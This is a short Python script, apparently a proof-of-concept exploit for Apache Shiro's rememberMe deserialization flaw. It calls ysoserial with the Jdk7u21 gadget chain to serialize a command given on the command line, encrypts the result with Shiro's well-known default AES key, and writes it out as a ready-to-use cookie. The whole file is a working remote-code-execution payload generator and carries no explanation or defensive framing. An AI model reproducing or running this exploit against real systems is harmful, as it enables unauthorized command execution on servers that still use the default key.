# pip install pycrypto
import sys
import base64
import uuid
import subprocess

from Crypto.Cipher import AES
 
def encode_rememberme(command):
    popen     = subprocess.Popen(['java', '-jar', '/tmp/ysoserial.jar', 'Jdk7u21', command], stdout=subprocess.PIPE)
    BS        = AES.block_size
    pad       = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key       = "kPH+bIxk5D2deZiIxcaaaA=="
    mode      = AES.MODE_CBC
    iv        = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    
    return base64_ciphertext

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'Usage:', sys.argv[0], 'command_to_execute'
        sys.exit(0)

    payload = encode_rememberme(sys.argv[1]) 
    with open("/tmp/cookie.txt", "w") as f:
        f.write("rememberMe={}".format(payload.decode()))

    print 'Wrote /tmp/cookie.txt'
